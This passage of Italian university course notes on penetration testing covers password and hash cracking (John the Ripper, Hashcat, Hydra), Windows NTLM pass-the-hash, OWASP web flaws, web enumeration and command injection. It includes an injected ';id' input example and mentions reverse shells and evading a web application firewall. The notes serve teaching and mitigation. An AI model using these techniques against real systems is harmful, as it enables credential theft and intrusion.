\item cercare informazioni dell'utente targettato o del gruppo di utenti targettati
\item ...
\end{itemize}
John the Ripper cerca di trovare la password o qualcosa di relativo alla password: spesso, partendo da una password si cerca di variarla in qualche modo (ad esempio con lettere, numeri al posto di vocali etc). È possibile quindi costruire dei pattern a partire da una parola (ad esempio "casa") in modo da ampliare il dizionario ed aumentare la percentuale di casi in cui si cracka la password. È anche possibile entrare in possesso dell'hash della password di una rete wireless: ci si mette vicino alla rete, si fa un dump dei pacchetti scambiati con il router da un utente e si ricava l'hash della password.
\paragraph{Hashcat}"alter ego" di John teh Ripper, più funzionale per il cracking di hash utilizzando le GPU, permette di specificare delle maschere, è inoltre più flessibile nella definizione delle regole.
\\\\ \textbf{NB:}ai fini dell'esame, se per crackare un hash ci metti più di 5 minuti, vuol dire che hai sbagliato qualcosa (basta il dizionario rockyou).
\paragraph{Cracking online}Hydra è un tool per il cracking delle password online: supporta moltissimi protocolli, possiamo passare una lista di username e di passwowrd e lui le tenta tutte.
\subsection{Windows hashes}
Su Linux, le password sono salvate come hash, usando anche un valore di salt. Al login, si fa l'hash della password passata e si confronta con l'hash salvato. Nel caso di Windows, un hash può essere importante tanto quanto lo è una password: Windows usa molti tipi di hash, ci sono 3 tipi generali
\begin{itemize}
\item LM: hash delle prime versioni, ma ancora oggi usato. È un hash function veloce da crakcare, le hash sono salvate in un file tipo \textsf{/etc/shadow}, che però si chiama \textsf{SAM}. Windows può essere installato installato in modalità domain, dove il db si chiama NTDS e si trova su una "macchina" speciale che è il Domain Controller. L'autenticazione è stata spenta da Win Vista.
\item NTLM: nuovo tipo di hash, con cui Win10 salva gli hash sul DB. Facendo il dump del DB, non troviamo un hash, bensì hash:hash, tutto quello che viene prima dei 2 punti è l'hash LM, l'altro è l'hash NT. La cosa che sembra strana è che il salvataggio avviene due volte, non sempre in quanto spesso l'hash LM non è presente ma viene comunque chiamato NTLM.
\item Net-NTLM: presente in due versioni v1 e v2, vengono usate in rete. IN particolare, quando avviene l'autenticazione tramite rete entra in gioco il protocollo NTLM, che è di tipo challenge-response: il server invia una challanege, uso la password per ottenere un hash della challenge, il server fa lo stesso e se coincidono, otteniamo l'autenticazione. Dalla versione v2 l'algoritmo è completamente differente e più difficile da crackare. Per rispondere al protocollo di C-R, il client prende la challenge, ne fa l'hash con la password e lo rimanda al server, che fa la verifica.
\end{itemize} 
per l'autenticazione su rete, avere anche solo l'hash della password va bene: se riusciamo a leggere il file SAM, possiamo impersonare gli utenti anche solo con l'hash. La response del client dovrebbe basarsi sulla password e sulla challenge, ma Microsoft ha deciso di calcolare la response basandosi sull'hash della password. Quindi, preso l'hash NT o LM, quella è la stringa che viene usata per calcolare la response. Quindi, anche conoscendo l'hash è possibile autenticarsi. Normalmente nel challenge-response è buona norma che sia il server a scegliere la challenge e che poi il client risponda, mentre su questi protocolli è il client che può scegliere la challenge. Se siamo loggati su Win, non è possibile accedere al file del database SAM, ma è possibile fare una copia di 3 file, che possono essere letti. È necessaria una sessione come SYSTEM (che ha permessi più elevati di ADMINISTRATOR), ma basta aprire una shell come ADMIN per eseguire i comandi. Ci sono dei programmi per fare ciò, tra cui Mimikatz, che viene però riconosciuto come pericoloso da Win.
\section{Web Applications}
All'interno della macchina target, c'è un applicazione a cui si può accedere e quindi a livello di rete il firewall fa passare le richieste in quanto l'utente può accedere. All'interno della stessa rete, possono esserci dei servizi a cui l'utente non può accedere, protetti dal firewall: a livello di rete il firewall garantisce che un attaccante non possa accedervi, ma spesso l'applicazione è sviluppata in modo custom e se non è sicura può permettere all'attaccante di accedere al resto dei servizi e delle infrastrutture che dovrebbero essere protette. Le applicazioni web sono molto diffuse e sono target di molti attacker, che le usano come punto per iniziare un attacco verso un servizio: il processo di ricerca di vulnerabilità di siti web viene automatizzato per poter essere scalato su altre app simili.\\ Le web app sono semplici da sviluppare, ma non dal punto di vista della sicurezza. I threats che possono esserci in una web app sono varie:
\begin{itemize}
\item information disclosure: segreti aziendali, informazioni finanziare etc
\item perdita di dati: sovrascrittura di dati, modifica dei dati in modo da corromperne l'integrità
\item denial of service (DoS)
\end{itemize}
La comunicazione nelle applicazioni web si basa prevalentemente su HTTP:
\begin{itemize}
\item GET: richiesta di risorse
\item POST: si possono inviare nel body anche dei parametri
\end{itemize}
\subsection{OWASP}Ente che si occupa di promuovere lo sviluppo di web application sicure, stila una classifica di vulnerabilità presenti nelle web application periodicamente.
\paragraph{Injection}Un esempio è la SQL injection: metto in una query di select, nella parte del where, di inserire una condizione sempre vera. Per mitigare questo tipo di threat, occorre sempre validare l'input utente. Inoltre, nel caso di SQL è possibile usare prepared statement e garantire privilegi minori agli utenti che accedono al DB.
\paragraph{Malicious file execution}php permette di includere dei file all'utente, questo può portare all import di file malevoli e farli eseguire. Anche qui, una soluzione può essere validare l'input e permettere solo di includere risorse esterne.
\paragraph{Broken authn  e session management}tecniche di session hijacking, come ad esempio eavesdropping se il canale non è protetto. Per poter risolvere ci sono varie strade, ad esempio generando nuovi session ID sul login, usare cookie per salvare i session ID.
\paragraph{Cross Site Scripting}in relazione con la gestione della sessione delle autorizzazioni: la vittima non è più l'host, bensì gli altri utenti che vi si collegano. Lato utente, quando si comunica con HTTP viene eseguito del codice JS, se l'input dell'utente non viene validato, accade che quando altri utenti vi accedono il browser lo eseguirà (ad esempio, un forum che permette i commenti).
\\\\ Spesso si arriva alla fase di exploitation o attraverso vulnerabilità di servizi oppure tramite il web. Attaccare una web app può significare molte cose, in particolare ci sono molti meccanismi che funzionano sul web e che permettono di ottenere un punto di accesso. Poiché una web app è solitamente composta da client e server, possiamo attaccare una delle due applicazioni: per il server ci sono:
\begin{itemize}
\item injection
\item buffer overflow
\item ...
\end{itemize}
mentre per il client:
\begin{itemize}
\item exploit del JS, che viene eseguito nel browser nel momento in cui si accede ad una web app.
\item ...
\end{itemize}
possiamo iniettare dei contenuti malevoli nell'applicazione in modo che ogni client li esegua quando si connette all'app. Una volta ottenuto l'accesso tramite web, c'è la fase di privilege escalation, intesa sia come aumento dei privilegi lato web, ma anche sulla macchina in se nel caso in cui abbiamo ottenuto una shell sulla macchina (sia client che server). Tipicamente l'attacco client necessita di interazione, l'attacco lo si ottiene quando il client effettua un'azione, come ad esempio un click o l'accesso ad un sito web.
\subsection{Web Enumeration}
Raccolta informazioni su applicazioni web.
\paragraph{Enumeration folder}per scoprire quali path esistono nel sito web, si fa una enumerazione di file e cartelle usando una wordlist, mandando delle GET e vedendo le risposte. Potrebbero esserci file che implementano una parte vulnerabile per la web app, oppure file e cartelle che nascono link. Tutti i tool si basano sulla risposta HTTP: a seconda del codice di risposta, otteniamo delle informazioni:
\begin{itemize}
\item 200: richiesta eseguita con successo
\item 500: server è andato in errore per colpa sua
\item 400: errore del server causato dal client
\end{itemize}
Un'altra informazione di cui avvalersi è il file robots.txt: veniva usato per dare istruzioni ai "robot" del web, ovvero che visitano ed indicizzano i siti web in automatico (come Google) per togliere dall'indicizzazione alcuni file. Lato attaccante, il file deve essere leggibile a tutti, quindi possiamo conoscere dei path che vengono o tolti dall'indicizzazione o aggiunti.\\ Ci sono 2-3 tool utilizzabili:
\begin{itemize}
\item Dirbuster
\item Dirsearch
\item Gobuster: più recente, scritto in Go e molto customizzabile
\end{itemize}
nell'implementazione di dirsearch o gobuster non viene fatta la ricerca ricorsivamente nelle cartelle che si trovano, quindi va fatta a mano. Per quanto riguarda le estensioni da cercare, ce e sono alcune che vale la pena cercare, molte non sono standard:
\begin{itemize}
\item con vim è possibile che venga creato un file di backup che termina con (tilde), quindi se quel file non viene cancellato, potremmo enumerare la versione .php(tilde) che quindi non viene eseguito dal server web, bensì restituito così com'è
\item php con tutte le estensioni 3-4-5-7
\item .asp, .aspx, .asmx
\item .js
\item .py, .cgi, .pl etc...
\end{itemize}
\paragraph{Parameter enumeration}in una richiesta HTTP ci sono parametri di GET o di POST, nel caso di GET vengono messo nell'URL mentre nella POST vengono messi nel body. In una GET, sia i parametri che il contenuto devono essere human readable, inoltre l'URL non può eccedere una certa taglia. Quindi, se abbiamo bisogno di flessibilità usiamo la POST. Da un punto di vista protocollare, la GET era pensata per essere idempotente, quindi che il server non cambiasse mai stato, mentre la POST ammette cambiamenti di stato, quindi ad esempio a seguito di un login avviene un cambiamento di stato. Una pagina in php potrebbe avere dei parametri e cambiare il funzionamento in base alla presenza o meno del parametro. Il programma wfazz prende come input un punto della richiesta HTTP, una wordlist e sostituisce in quel punto ogni parola della wordlist; il punto in cui fare fuzzing viene identificato con la parola \textit{FUZZ}. wfuzz non sa quando una richiesta restituisce un valore corretto o no: si può tentare con trial and error
\subsubsection{Bruteforcing}
Può rendersi necessario dover effettuare il brute forcing di un form di login web, uno dei tool che si possono usare è hydra: per capire quando il login è fallito o ah avuto successo è possibile specificare un parametro nel comando, viene usato più spesso il messaggio di insuccesso.
\subsection{Command injection}
Il solito problema, non esclusivo delle web application, è che occorre prendere dati dall'utente. Bisogna controllare che i dati siano validi, che non implicano problemi di sicurezza, ovvero che non sta cercando di iniettare qualcosa che non siamo pronti a gestire, perché nel momento in cui viene passato qualcosa di non previsto nel flusso dell'applicazione e viene usato per comandi su shell, query SQL etc..., messo così com'è si rischia di incorrere in problemi di injection. Le command injection avvengono nel momento in cui provo a prendere i parametri dall'utente e li uso come comando su shell, o nell'interprete con cui è sviluppata l'applicazione, e permettono di eseguire comandi arbitrari.
\subsubsection{Common gateway interface}ormai vecchie, anche se è ancora in uso. È un modo per sviluppare una web app usando un qualsiasi linguaggi di programmazione in back-end: si sviluppava l'app, si abilita il modulo di apache e si mette nella cartella apposita lo script e poi viene presentata al client come HTML. La parte dinamica di acquisizione input è lato back-end, l'utente passa i parametri e sta chiamando uno script scritto in qualche linguaggio, che viene eseguito dal server e restituisce una pagina (html) al client. Gli script sono cgi, ovvero scritti in diversi linguaggi che possono esser perl, bash etc..., cambia l'environment in cui lavora il back-end ed è importante capire questo: in base all'environment, ci sarà la possibilità di fare diverse cose dal punto di vista di attacco.\\ Ormai non è più usato, se non per piccoli dispositivi embedded, ad oggi si trovano web-app scritte in php, Java, python + nodeJS etc... Dal punto di vista di command injection non cambia nulla, in quanto la necessità di prendere input dall'utente può sempre essere necessario.
\subsubsection{Come fare command injection}
Immaginiamo di avere uno script bash, che fa il cat di un file e l'output viene mandato col comando mail ad un indirizzo passato come input al programma. Nel mondo web, ci sarà uno script cgi che fa una cosa simile nel back-end, cosa può succedere: lo script può essere usato per passare dei file internamente, qualcuno lo mette in un web service come cgi script. Se mi rendo conto che sto facendo questa cosa che l'environment è bash, questo permette di concatenare i comandi e quindi potrei mandare come input una mail e passare qualcosa come ;id questo diventa un problema. Quindi, posso manipolare il flusso dell'applicazione facendo eseguire \textbf{in back-end} dei comandi arbitrari.\\ Tra i linguaggi più diffusi per scrivere il back-end c'è php, che permette di scrivere in una pagina web del codice che permette di renderizzare il contenuto in base all'utente. Il problema del php, come anche di altri linguaggi, è che ci sono delle procedure che eseguono i comandi inseriti all'interno del server stesso:
\begin{itemize}
\item exec()
\item shell\_exec()
\item passthru()
\item ...
\end{itemize}
quindi se una pagina web contiene qualcosa del genere, è rischioso in quanto i parametri possono essere direttamente eseguiti su shell. Il problema è che se non viene validato l'input, magari il path utente è alterato ed include, ad esempio, comandi concatenati. Quindi, quello che si fa lato attacker è sfruttare la situazione per prendere informazioni, fare una reverse shell etc... Le web app possono essere protetti dai Web Application Firewall (WAF) che sono programmati per cercare di filtrare i comandi passati con "\& | ;" etc... Per poter aggirare questo problema, possiamo sfruttare altri aspetti del linguaggio.
\subsubsection{Mitigazione di command injection}
Per poter mitigare il caso in cui è possibile mitigare una command injection è la validazione e sanificazione dell'input:
\begin{itemize}
\item nel momento in cui il parametro va usato per qualsiasi cosa (per prendere un file, fare query etc...) bisogna verificare che rientri in quello che ci aspettiamo: se mi aspetto un input un IP addr, devo ricevere solo un IP addr
\item se ho ricevuto l'input corretto, ma magari ci sono delle cose che non tornano, come le virgole al posto dei punti in un IP, posso sostituirli con dei punti
\item per parametri non standard, si cercano tutti i caratteri che rimandano ad un possibile attacco o che possono inficiare il comando, tramite regexp, whitelist (la stringa contiene solo caratteri che nella lista) o blacklist (non sono presenti i caratteri della lista)
\item un altro modo per mitigare i problemi è limitare i privilegi
\end{itemize}

\end{document}